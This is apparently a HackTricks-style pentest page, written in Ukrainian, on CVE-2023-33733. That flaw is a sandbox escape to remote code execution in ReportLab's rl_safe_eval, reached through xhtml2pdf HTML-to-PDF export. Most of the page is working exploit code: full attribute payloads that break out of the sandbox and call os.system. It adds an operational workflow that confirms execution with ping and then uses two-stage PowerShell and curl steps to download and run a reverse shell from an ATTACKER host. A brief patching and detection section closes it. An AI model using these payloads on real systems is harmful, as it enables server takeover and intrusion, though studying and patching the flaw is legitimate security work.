# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Ця сторінка документує практичний escape з sandbox та примітив RCE в rl_safe_eval від ReportLab, який використовується xhtml2pdf та іншими пайплайнами генерації PDF при рендерингу керованого користувачем HTML у PDF.

CVE-2023-33733 впливає на ReportLab версії до і включно 3.6.12. В певних контекстах атрибутів (наприклад color) значення, загорнуті в triple brackets [[[ ... ]]], оцінюються на стороні сервера за допомогою rl_safe_eval. Шляхом створення payload, що піводить від дозволеного builtin (pow) до його Python function globals, атакуючий може дістатися до модуля os і виконати команди.

Ключові моменти
- Trigger: інжектувати [[[ ... ]]] в evaluated attributes, такі як <font color="..."> у розмітці, що парситься ReportLab/xhtml2pdf.
- Sandbox: rl_safe_eval заміщає небезпечні builtins, але все ще оцінювані функції відкривають __globals__.
- Bypass: створити тимчасовий клас Word щоб обійти перевірки імен rl_safe_eval і отримати рядок "__globals__", уникаючи фільтрації заблокованих dunder-імен.
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stability: Повернути дійсне значення для атрибута після виконання (для color використати and 'red').

Коли тестувати
- Додатки, які надають експорт HTML-to-PDF (профілі, рахунки, звіти) і показують xhtml2pdf/ReportLab у метаданих PDF або у коментарях HTTP-відповіді.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- HTTP-відповідь для PDF часто починається з ReportLab generator comment

Як працює обхід sandbox
- rl_safe_eval видаляє або замінює багато builtins (getattr, type, pow, ...) і застосовує фільтрацію імен, щоб заборонити атрибути, що починаються з __ або є у denylist.
- Проте безпечні функції живуть у globals-словнику, доступному як func.__globals__.
- Використовуйте type(type(1)) щоб відновити реальну вбудовану функцію type (обминаючи wrapper від ReportLab), потім визначте клас Word, похідний від str, з мутованою поведінкою порівняння так, що:
  - .startswith('__') → завжди False (обхід перевірки name startswith('__'))
  - .__eq__ повертає False лише при першому порівнянні (обхід перевірки членства у denylist) і True опісля (щоб Python getattr працював)
  - .__hash__ = hash(str(self))
- За допомогою цього getattr(pow, Word('__globals__')) повертає globals dict обгорнутої функції pow, який містить імпортований модуль os. Далі: ['os'].system('<cmd>').

Мінімальний патерн експлуатації (приклад для атрибута)
Розмістіть payload всередині evaluated attribute і переконайтесь, що він повертає дійсне значення атрибута через boolean and 'red'.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- Форма з list-comprehension дозволяє один вираз, прийнятний для rl_safe_eval.
- Трейлінг and 'red' повертає дійсний CSS color, тож рендеринг не зламається.
- Замініть команду за потреби; використайте ping щоб перевірити виконання через tcpdump.

Операційний робочий процес
1) Ідентифікуйте PDF-генератор
- PDF Producer показує xhtml2pdf; HTTP-відповідь містить ReportLab comment.
2) Знайдіть input, що відображається в PDF (наприклад profile bio/description) і запустіть експорт.
3) Підтвердіть виконання низькошумним ICMP
- Run: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows часто відправляє рівно чотири echo requests за замовчуванням.
4) Встановіть шелл
- Для Windows надійний two-stage підхід уникає проблем з quoting/encoding:
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (execute):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Для Linux-таргетів можливий подібний two-stage з curl/wget:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Нотатки та поради
- Контексти атрибутів: color відомий як evaluated attribute; інші атрибути в ReportLab markup також можуть оцінювати вирази. Якщо одне місце санітайзиться, спробуйте інші, що рендеряться у PDF flow (різні поля, table styles тощо).
- Quoting: тримайте команди компактними. Two-stage завантаження значно зменшують проблеми з quoting та escaping.
- Надійність: якщо експорти кешуються або ставляться у чергу, трохи варіюйте payload (наприклад випадковий шлях або query), щоб уникнути кешування.

Захист та виявлення
- Оновіть ReportLab до 3.6.13 або новішої (CVE-2023-33733 виправлено). Слідкуйте також за security advisories у пакетах дистрибутивів.
- Не передавайте user-controlled HTML/markup безпосередньо у xhtml2pdf/ReportLab без суворої санітизації. Видаляйте/забороняйте [[[...]]] evaluation constructs та vendor-specific теги коли вхід ненадійний.
- Розгляньте відключення або обгортання використання rl_safe_eval повністю для ненадійних входів.
- Моніторьте підозрілі вихідні з’єднання під час генерації PDF (наприклад ICMP/HTTP від app servers при експорті документів).

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
